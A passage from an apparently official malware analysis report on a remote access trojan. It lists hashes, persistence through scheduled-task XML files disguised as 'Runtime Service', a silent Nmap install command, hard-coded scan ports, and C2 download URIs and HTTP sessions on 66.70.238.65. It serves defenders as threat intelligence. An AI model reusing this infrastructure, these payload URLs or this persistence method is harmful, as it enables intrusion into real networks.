\"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to the Nmap file path \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It enables and runs the scheduled task named \"Runtime Service\" to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tIf the PE file is installed, it will attempt to retrieve and verify the last write time of the file with the date and time: \"Sunday, April 24, 2022 11:31:45 AM\" retrieved from the C2 server using the hard-coded URI:\"http[:]//66[.]70[.]238[.]65/txt.txt\".\n\n\t\t\tAnalysis indicates that if the last write time of the file is less than the date and time retrieved from the C2 server, it will search for the running process named \"RuntimeService\" and attempt to stop and delete it from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" if the file is running on the victim's system. It downloads and installs the PE file into \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\". It copies the PE file from \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It enables and runs the scheduled task named \"Runtime Service\" to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tIt is designed to delete the other files below before existing its code execution:\n\n\t\t\t--Begin deleted files--\n\t\t\t\"C:\\Users\\Public\\Downloads\\RuntimeService.exe\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\this.xml\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\that.xml\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\this.ps1\"\n\t\t\t--End deleted files--\n\n\t\t\tDisplayed below are the URIs used to download the files above:\n\n\t\t\t--Begin URIs--\n\t\t\thttp[:]//66[.]70[.]238[.]65/RuntimeService.exe\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/that.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.ps1\n\t\t\t--End URIs--\nScreenshots\n \n\nFigure 9 - A snippet of the contents of the PowerShell script file \"ps.ps1\".\n\n\n\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\nDetails\n\n\n\nName\nthat.xml\n\n\nSize\n1876 bytes\n\n\nType\nXML 1.0 document, ASCII text\n\n\nMD5\n80343fb39fe8657f3f3904509b59d1d2\n\n\nSHA1\n0fdf6315f3459e337801cb8663ef70bfc94ba4cb\n\n\nSHA256\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\nSHA512\nb18460384336492df594d024b35597cd24f637b9f17661415ad163487d6d9046e42727a20be03dbc89c2823f51336c1a09e889bfd0a1b23e5b6826a37c62bb2b\n\n\nssdeep\n48:cZkwRMAMWdpfL6QuFdOFQOzNI3ODOiDdKrZuTy2hv:QkwqALdIQuFdOFQOzvdKrZurx\n\n\nEntropy\n5.087722\n\n\nPath\nC:\\Users\\Public\\Downloads\\that.xml\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n6408217e10...\nDownloaded_From\n66.70.238.65\n\n\n6408217e10...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n6408217e10...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n\nDescription\nThis artifact is the scheduled task XML file downloaded and installed by \"1940ddb77882162f898bc3aae9c67d94\" and \"84aadb11699f0c3ed062f484aa0a622e\". It contains the task's properties, triggers, actions, conditions, and settings used to create a scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" for persistence. It is designed to execute the PowerShell script file from \"C:\\Users\\Public\\Documents\\ps.ps1\" in everyday from January 01, 2022.\nScreenshots\n \n\nFigure 10 - A snippet of the contents of the XML file \"that.xml\".\n\n\n\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\nDetails\n\n\n\nName\nthis.xml\n\n\nSize\n1734 bytes\n\n\nType\nXML 1.0 document, ASCII text\n\n\nMD5\nd5e111c8cea4d2c8e8ae15a570ff8d3d\n\n\nSHA1\n47854e2eeb133e8d1336544b83034b22ff23a01d\n\n\nSHA256\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\nSHA512\n231ed18b6fffc00ba1274b2a4a2bf9521edd2d66e79f4daa7c1238068950bc418995df0d5c37dec5e857e2db78aad78676dcb0c1c694240c098dc9438c003e35\n\n\nssdeep\n48:cAJwQ7L6QrFdOFQO0I3ODOiQdKrlsTuTFzn6hWv:pJwQqQrFdOFQO1dKrlsTukc\n\n\nEntropy\n5.120165\n\n\nPath\nC:\\Users\\Public\\Downloads\\this.xml\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n407d606267...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n407d606267...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n407d606267...\nUsed\n66.70.238.65\n\n\n\nDescription\nThis artifact is the scheduled task XML file downloaded and installed by \"1940ddb77882162f898bc3aae9c67d94\" and \"84aadb11699f0c3ed062f484aa0a622e\". It contains the task's properties, triggers, actions, conditions, and settings used to create a scheduled task named \"Runtime Service\" for persistence. It is designed to execute the Python PE compiled file from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with the arguments below in every system reboot.\n\n\t\t\t--Begin arguments--\n\t\t\t[C2 server IP address] [Port number] [threads]\n\t\t\t66[.]70[.]238[.]65 50106 250\n\t\t\t--End arguments--\nScreenshots\n \n\nFigure 11 - A snippet of the contents of the XML file \"this.xml\".\n\n\n\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\nTags\nremote-access-trojantrojan\nDetails\n\n\n\nName\nRuntimeService.exe\n\n\nSize\n10499185 bytes\n\n\nType\nPE32+ executable (console) x86-64, for MS Windows\n\n\nMD5\n172fbaf8328f5622a0f69f6cb3b346ac\n\n\nSHA1\nbf75089650548a31be31631c4d44fdfe7d9e6a10\n\n\nSHA256\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\nSHA512\ncadeb546f460e308a2223c6c4253d2d1d82cd9e2e189db848825ad1c433265bc273031bb5c10312b0f62b5f41c11bd7e62bf5857e5cc3e1cc7d744dbc691b22d\n\n\nssdeep\n196608:q3Cl+v+GIZ5G7zj9AKm6gUU8gBk6U9onJ5hrZERuyiU8AdZYJERoSESeYrTE/HNZ:aCl+2PfG3GH6YkN9c5hlER+AdZYyPyYC\n\n\nEntropy\n7.988837\n\n\n\nAntivirus\n\n\n\nAvira\nTR/Agent.admh\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2021-11-09 13:03:59-05:00\n\n\nImport Hash\n51a5e6ba413b3d4c2f9ffde72d1f2a95\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\nbf6d301ab7d62220dc488f08ec0dc017\nheader\n1024\n2.922928\n\n\n296184d617a998fb5244b87ad131770c\n.text\n162816\n6.493682\n\n\nef931db6e8a997c4ba0b405b31b5349c\n.rdata\n72192\n5.730013\n\n\nffa48c07142397865c293efb2dc70cb6\n.data\n3584\n1.810884\n\n\n2b2684f42c4fc5ca696311223fc0c0d3\n.pdata\n8704\n5.277038\n\n\n27cd2196d9e6b2418e3874d945121423\n_RDATA\n512\n1.992418\n\n\n0b9cac140f54173799c8615513ec7d8b\n.rsrc\n138752\n5.260759\n\n\ncf5992ed51a42f136642584614acc53c\n.reloc\n2048\n5.255159\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ 8.0 (DLL)\n\n\n\nRelationships\n\n\n\nb050749c87...\nDownloaded_From\n66.70.238.65\n\n\nb050749c87...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\nb050749c87...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n\nDescription\nThis artifact is a 64-bit Python 3.9 compiled executable downloaded and installed by \"this.ps1\" (1940ddb77882162f898bc3aae9c67d94) and \"ps.ps1\" (84aadb11699f0c3ed062f484aa0a622e). This file and \"eda057d006561e28563813b2e81b9fd0\" have similar code function. The file is executed by scheduled task named \"Runtime Service\" from the task specified in the XML file \"C:\\Users\\Public\\Downloads\\this.xml\" on the victim's system. It executes the file with the arguments below in every system reboot.\n\n\t\t\t--Begin arguments--\n\t\t\t[C2 server IP address] [Port number] [threads]\n\t\t\t66[.]70[.]238[.]65 50106 250\n\t\t\t--End arguments--\n\n\t\t\tWhen executed, it attempts to connect to the specified C2 IP address and port and waits for a response. The response payload was not available for analysis. Analysis indicates that once the response is received, it is designed to perform the functions below:\n\n\t\t\t--Begin functions--\n\t\t\tIt is capable of scanning multiple endpoints using Nmap NSE scripts. It is capable of running specified Nmap NSE scripts to perform a variety of tasks and store the output in JSON format.\n\t\t\tIt is capable of performing scans to find out all IP addresses of live hosts, open ports and services running on those hosts.\n\t\t\tIt is capable of performing banner grabbing: find open ports of a host and grab different banners of services available on different ports.\n\t\t\tIt is capable of collecting public key certificates information from the compromised system.\n\t\t\tIt is capable of starting and closing socks connection.\n\t\t\tThe scanned results and the collected information can be sent in JSON format through a specified socket to the attacker's C2 server.\n\t\t\t--End functions--\n\n\t\t\tDisplayed below are the hard-coded ports scanned at runtime:\n\n\t\t\t--Begin ports--\n\t\t\t22\n\t\t\t80\n\t\t\t8080\n\t\t\t8888\n\t\t\t8060\n\t\t\t8081\n\t\t\t443\n\t\t\t1443\n\t\t\t2443\n\t\t\t3443\n\t\t\t4443\n\t\t\t5443\n\t\t\t6443\n\t\t\t7443\n\t\t\t8443\n\t\t\t9443\n\t\t\t10443\n\t\t\t11443\n\t\t\t12443\n\t\t\t3389\n\t\t\t9200\n\t\t\t27017\n\t\t\t3306\n\t\t\t1433\n\t\t\t5432\n\t\t\t--End ports\n\n\t\t\tDisplayed below are the hard-coded services scanned at runtime:\n\n\t\t\t--Begin services--\n\t\t\t22: 'ssh'\n\t\t\t80: 'http'\n\t\t\t443: 'https'\n\t\t\t1433: 'ms-sql-s'\n\t\t\t3389: 'ms-wbt-server'\n\t\t\t5432: 'postgresql'\n\t\t\t3306: 'mysql'\n\t\t\t9200: 'wap-wsp'\n\t\t\t8080: 'http-proxy'\n\t\t\t8081: 'blackice-icecap'\n\t\t\t8888: 'sun-answerbook'\n\t\t\t8060: 'aero'\n\t\t\t1443: 'ies-lm'\n\t\t\t2443: 'powerclientcsf'\n\t\t\t3443: 'ov-nnm-websrv'\n\t\t\t4443: 'pharos'\n\t\t\t5443: 'spss'\n\t\t\t6443: 'm2ap'\n\t\t\t7443: 'oracleas-https'\n\t\t\t8443: 'https-alt'\n\t\t\t9443: 'tungsten-https'\n\t\t\t27017: 'mongodb'\n\t\t\t10443: 'cirrossp'\n\t\t\t11443: 'unknown'\n\t\t\t12443: 'unknown\n\t\t\t--End services--\n\n\t\t\tDisplayed below is the format of the public key certificates data collected at runtime:\n\n\t\t\t--Begin certificate information--\n\t\t\tSubject: The certificate's subject\n\t\t\tIssuer: The certificate's issuer\n\t\t\tHas-expired: x509 cert has expired\n\t\t\tNot-after: The not after portion of the certificate's validity period\n\t\t\tNot-before: The not before portion of the certificate's validity period\n\t\t\tSerial-number: The certificate's serial number\n\t\t\tSerial-number(hex): The certificate's serial number in hexadecimal\n\t\t\tSignature-algorithm: The certificate's signature algorithm\n\t\t\tVersion: The X.509 version number\n\t\t\tPulic-key-length: The certificate public key length\n\t\t\tExtensions': The X.509 extensions\n\t\t\t--End certificate information--\nScreenshots\n \n\nFigure 12 - A snippet of the contents of the decompiled Python script that was compiled into the PE executable file.\n\n\n\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\nDetails\n\n\n\nName\nn.zip\n\n\nSize\n26908472 bytes\n\n\nType\nZip archive data, at least v2.0 to extract\n\n\nMD5\n44a34e9bbaee0c0d85f21eb60b723b4e\n\n\nSHA1\n83ee8b6067e45721bf3536e9c37de4b71eb379b8\n\n\nSHA256\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\nSHA512\n084195549fb3f103b89b7c53a1deff470e2bd010f0e2946abddd3c049673e3e16bfdadcca12a644d4fd7513dcf44a2aca924f29f9a267ee2f469a720994a9cb7\n\n\nssdeep\n786432:rA7CzbNVAaXjV67W26VsHbh4mnHlPFPsCsdmWw:rA2bN6Ooj6uquxD\n\n\nEntropy\n7.999992\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n42c844c62a...\nDownloaded_From\n66.70.238.65\n\n\n42c844c62a...\nContains\n3b4d726bd366e7439367fa78a186dfa9b641d3b2ad354fd915581b6567480f94\n\n\n42c844c62a...\nContains\nfb833ecd1b1050304f364f879b8b1f7b7136e9c4a21aaf0a6c6b3f419e892d6d\n\n\n42c844c62a...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n42c844c62a...\nDownloaded_By\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n\nDescription\nThis artifact is a zip compressed file downloaded and installed by \"this.ps1\" (8aedb094121903a3bfc3dade34f48126) and \"this.ps1\"(1940ddb77882162f898bc3aae9c67d94). It contains the Nmap installer and elasticsearch NSE file. The files within the zip file are extracted into the directory below:\n\n\t\t\t--Begin files--\n\t\t\t\"C:\\Users\\Public\\Downloads\\nmap.exe\"\n\t\t\t\"C:\\Users\\Public\\Downloads\\elasticsearch.nse\" ==> It copies the NSE file from the current directory \"C:\\Users\\Public\\Downloads\\elasticsearch.nse\" to \"C:\\Program Files (x86)\\Nmap\\scripts\\elasticsearch.nse\".\n\t\t\t--End files--\n\n\n3b4d726bd366e7439367fa78a186dfa9b641d3b2ad354fd915581b6567480f94\nTags\ntrojan\nDetails\n\n\n\nName\nnmap.exe\n\n\nSize\n26922800 bytes\n\n\nType\nPE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive\n\n\nMD5\nfefb55e050667ef286ef6ee8a06567f9\n\n\nSHA1\n899e7dfa6facd782bfc70b1a797ccfeb9fd7e1a6\n\n\nSHA256\n3b4d726bd366e7439367fa78a186dfa9b641d3b2ad354fd915581b6567480f94\n\n\nSHA512\n2513688284ddb80c8509fd6874354c0fd10146c1d769b4ce2c217e9cd8175c0229fa5cb582882bfea1f58f5ba610419d11e6b9b15ea75606b30d347f78f00ac9\n\n\nssdeep\n786432:vy3C1hTHsW5NnADW8YxinJD4QfldH9VGoc7AAJ:vyihTMgKZYOqaHG\n\n\nEntropy\n7.999939\n\n\n\nAntivirus\n\n\n\nComodo\nApplicUnwnt\n\n\nNETGATE\nTrojan.Win32.Malware\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2016-04-01 23:20:54-04:00\n\n\nImport Hash\nb1a57b635b23ffd553b3fd1e0960b2bd\n\n\nCompany Name\nInsecure.org\n\n\nFile Description\nNmap installer\n\n\nInternal Name\nNmapInstaller.exe\n\n\nLegal Copyright\nCopyright (c) Insecure.Com LLC (fyodor@insecure.org)\n\n\nOriginal Filename\nNone\n\n\nProduct Name\nNmap\n\n\nProduct Version\nNone\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\na67c22531da55e8142419ceef777e369\nheader\n1024\n2.303645\n\n\n80b022d1113608f672bdbe6d1012cd47\n.text\n24064\n6.429365\n\n\n4c84e530bf8db37146334e6c487170bf\n.rdata\n4608\n5.203736\n\n\n0fd354ee09c8f87b62e04f86606ed2dc\n.data\n1536\n4.124434\n\n\nd41d8cd98f00b204e9800998ecf8427e\n.ndata\n0\n0.000000\n\n\nf6a161d26781d4dd17f715ef40362b61\n.rsrc\n20480\n5.693243\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nNullsoft PiMP Stub -> SFX\n\n\n\nRelationships\n\n\n\n3b4d726bd3...\nContained_Within\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n\nDescription\nThis artifact is a 64-bit self-extracting archive executable file contained within the \"n.zip\" file (44a34e9bbaee0c0d85f21eb60b723b4e). This file has been identified as a variant of Nmap installer version 7.80. This file is installed by \"this.ps1\" with the command below:\n\n\t\t\t--Begin command--\n\t\t\tstart \"C:\\Users\\Public\\Downloads\\Nmap.exe\" \"/S\"\n\t\t\t--End command--\n\n\nfb833ecd1b1050304f364f879b8b1f7b7136e9c4a21aaf0a6c6b3f419e892d6d\nDetails\n\n\n\nName\nelasticsearch.nse\n\n\nSize\n2233 bytes\n\n\nType\nASCII text\n\n\nMD5\n133082d91e2cc40d69662661c1fa115b\n\n\nSHA1\n321259692d6ed870e35206f24031059f0140ca47\n\n\nSHA256\nfb833ecd1b1050304f364f879b8b1f7b7136e9c4a21aaf0a6c6b3f419e892d6d\n\n\nSHA512\n7d9530397676fbeefa2c1ac76c3f9a6ce05fa157a828db92e849bc41a4df2e81d591ac511cad4495eda07d467f1c7f410f79243e6e4998deb0b0dd81e9af7518\n\n\nssdeep\n48:rA5dFn4k5E5obBCNquG52acpIFSDsYsWSu:rA5v4k5TBeu2NIFSDy7u\n\n\nEntropy\n4.674081\n\n\nPath\nC:\\Program Files (x86)\\Nmap\\scripts\\elasticsearch.nse\n\n\nPath\nC:\\Users\\Public\\Downloads\\elasticsearch.nse\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nfb833ecd1b...\nContained_Within\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n\nDescription\nThis artifact is the NSE file contained within the \"n.zip\" (44a34e9bbaee0c0d85f21eb60b723b4e). This file is extracted and copied from \"C:\\Users\\Public\\Downloads\\elasticsearch.nse\" to \"C:\\Program Files (x86)\\Nmap\\scripts\\elasticsearch.nse\" by \"this.ps1\". This file has been identified as\n\t\t\tNmap Elasticsearch NSE for enumerating indices, plugins and cluster nodes on an elasticsearch target.\nScreenshots\n \n\nFigure 13 - A snippet of the contents of the Nmap Elasticsearch NSE file \"elasticsearch.nse\".\n\n\n\n66.70.238.65\nURLs\n\nhttp[:]//66.70.238.65/RuntimeService.exe\nhttp[:]//66.70.238.65/n.zip\nhttp[:]//66.70.238.65/ps.ps1\nhttp[:]//66.70.238.65/that.xml\nhttp[:]//66.70.238.65/this.xml\n\nPorts\n\n80 TCP\n50106 TCP\n\nHTTP Sessions\n\nGET /ps.ps1 HTTP/1.1\n\t\t\t\tHost \u00a0\u00a0\u00a066.70.238.65\n\t\t\t\tUser-Agent \u00a0\u00a0\u00a0Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\t\t\t\tAccept \u00a0\u00a0\u00a0text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\t\t\t\tAccept-Language \u00a0\u00a0\u00a0en-US,en;q=0.5\n\t\t\t\tAccept-Encoding \u00a0\u00a0\u00a0gzip, deflate\n\n\t\t\t\tGET /that.xml HTTP/1.1\n\t\t\t\tHost \u00a0\u00a0\u00a066.70.238.65\n\t\t\t\tUser-Agent \u00a0\u00a0\u00a0Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\t\t\t\tAccept \u00a0\u00a0\u00a0text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\t\t\t\tAccept-Language \u00a0\u00a0\u00a0en-US;q=0.5,en;q=0.3\n\t\t\t\tAccept-Encoding \u00a0\u00a0\u00a0gzip, deflate\n\t\t\t\tConnection \u00a0\u00a0\u00a0keep-alive\n\t\t\t\tUpgrade-Insecure-Requests \u00a0\u00a0\u00a01\n\n\t\t\t\tGET /RuntimeService.exe HTTP/1.1\n\t\t\t\tHost \u00a0\u00a0\u00a066.70.238.65\n\t\t\t\tUser-Agent \u00a0\u00a0\u00a0Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\t\t\t\tAccept \u00a0\u00a0\u00a0text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\t\t\t\tAccept-Language \u00a0\u00a0\u00a0en-US;q=0.5,en;q=0.3\n\t\t\t\tAccept-Encoding \u00a0\u00a0\u00a0gzip, deflate\n\t\t\t\tConnection \u00a0\u00a0\u00a0keep-alive\n\t\t\t\tUpgrade-Insecure-Requests \u00a0\u00a0\u00a01\n\n\t\t\t\tGET /this.xml HTTP/1.1\n\t\t\t\tHost \u00a0\u00a0\u00a066.70.238.65\n\t\t\t\tUser-Agent \u00a0\u00a0\u00a0Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\t\t\t\tAccept \u00a0\u00a0\u00a0text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\t\t\t\tAccept-Language \u00a0\u00a0\u00a0en-US;q=0.5,en;q=0.3\n\t\t\t\tAccept-Encoding \u00a0\u00a0\u00a0gzip, deflate\n\t\t\t\tConnection \u00a0\u00a0\u00a0keep-alive\n\t\t\t\tUpgrade-Insecure-Requests \u00a0\u00a0\u00a01\n\n\t\t\t\tGET /n.zip HTTP/1.1\n\t\t\t\tHost \u00a0\u00a0\u00a066.70.238.65\n\t\t\t\tUser-Agent \u00a0\u00a0\u00a0Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n\t\t\t\tAccept \u00a0\u00a0\u00a0text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n\t\t\t\tAccept-Language \u00a0\u00a0\u00a0en-US;q=0.5,en;q=0.3\n\t\t\t\tAccept-Encoding \u00a0\u00a0\u00a0gzip, deflate\n\t\t\t\tConnection \u00a0\u00a0\u00a0keep-alive\n\t\t\t\tUpgrade-Insecure-Requests \u00a0\u00a0\u00a01\n\t\t\t\t\u00a0\n\nWhois\nIP Location \u00a0\u00a0\u00a0Canada Canada Montreal Ovh Hosting Inc.\n\t\t\tASN \u00a0\u00a0\u00a0Canada AS16276 OVH, FR (registered Feb 15, 2001)\n\t\t\tResolve Host \u00a0\u00a0\u00a0ip65.ip-66-70-238.net\n\t\t\tWhois Server \u00a0\u00a0\u00a0whois.arin.net\n\t\t\tIP Address \u00a0\u00a0\u00a066.70.238.65\n\t\t\tNetRange: \u00a0\u00a0\u00a0 66.70.128.0 - 66.70.255.255\n\t\t\tCIDR: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 66.70.128.0/17\n\t\t\tNetName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0HO-2\n\t\t\tNetHandle: \u00a0\u00a0\u00a0 NET-66-70-128-0-1\n\t\t\tParent: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 NET66 (NET-66-0-0-0-0)\n\t\t\tNetType: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Direct Allocation\n\t\t\tOriginAS: \u00a0\u00a0\u00a0\n\t\t\tOrganization: OVH Hosting, Inc. (HO-2)\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-02-13\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-02-13\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/ip/66.70.128.0\n\n\t\t\tOrgName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OVH Hosting, Inc.\n\t\t\tOrgId: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HO-2\n\t\t\tAddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0800-1801 McGill College\n\t\t\tCity: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Montreal\n\t\t\tStateProv: \u00a0\u00a0\u00a0 QC\n\t\t\tPostalCode: \u00a0\u00a0\u00a0 H3A 2N4\n\t\t\tCountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0CA\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02011-06-22\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-01-28\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/HO-2\n\n\t\t\tOrgAbuseHandle: ABUSE3956-ARIN\n\t\t\tOrgAbuseName: Abuse\n\t\t\tOrgAbusePhone: +1-855-684-5463\n\t\t\tOrgAbuseEmail: abuse@ovh.ca\n\t\t\tOrgAbuseRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/ABUSE3956-ARIN\n\n\t\t\tOrgTechHandle: NOC11876-ARIN\n\t\t\tOrgTechName: NOC\n\t\t\tOrgTechPhone: +1-855-684-5463\n\t\t\tOrgTechEmail: noc@ovh.net\n\t\t\tOrgTechRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/NOC11876-ARIN\n\n\t\t\tNetRange: \u00a0\u00a0\u00a0 66.70.238.0 - 66.70.238.255\n\t\t\tCIDR: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 66.70.238.0/24\n\t\t\tNetName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OVH-DEDICATED-FO\n\t\t\tNetHandle: \u00a0\u00a0\u00a0 NET-66-70-238-0-1\n\t\t\tParent: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HO-2 (NET-66-70-128-0-1)\n\t\t\tNetType: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Reassigned\n\t\t\tOriginAS: \u00a0\u00a0\u00a0 AS16276\n\t\t\tOrganization: OVH Hosting, Inc. (HO-2)\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-06-24\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-06-24\n\t\t\tComment: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Failover IPs\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/ip/66.70.238.0\n\n\t\t\tOrgName: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0OVH Hosting, Inc.\n\t\t\tOrgId: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 HO-2\n\t\t\tAddress: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0800-1801 McGill College\n\t\t\tCity: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 Montreal\n\t\t\tStateProv: \u00a0\u00a0\u00a0 QC\n\t\t\tPostalCode: \u00a0\u00a0\u00a0 H3A 2N4\n\t\t\tCountry: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0CA\n\t\t\tRegDate: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02011-06-22\n\t\t\tUpdated: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a02017-01-28\n\t\t\tRef: \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/HO-2\n\n\t\t\tOrgAbuseHandle: ABUSE3956-ARIN\n\t\t\tOrgAbuseName: Abuse\n\t\t\tOrgAbusePhone: +1-855-684-5463\n\t\t\tOrgAbuseEmail: abuse@ovh.ca\n\t\t\tOrgAbuseRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/ABUSE3956-ARIN\n\n\t\t\tOrgTechHandle: NOC11876-ARIN\n\t\t\tOrgTechName: NOC\n\t\t\tOrgTechPhone: +1-855-684-5463\n\t\t\tOrgTechEmail: noc@ovh.net\n\t\t\tOrgTechRef: \u00a0\u00a0\u00a0https://rdap.arin.net/registry/entity/NOC11876-ARIN\nRelationships\n\n\n\n66.70.238.65\nContained_Within\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n66.70.238.65\nContained_Within\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n66.70.238.65\nConnected_From\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n66.70.238.65\nConnected_From\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\n66.70.238.65\nDownloaded_To\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\n66.70.238.65\nDownloaded_To\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\n66.70.238.65\nDownloaded_To\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n66.70.238.65\nContained_Within\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n66.70.238.65\nConnected_From\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n66.70.238.65\nUsed_By\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\n66.70.238.65\nUsed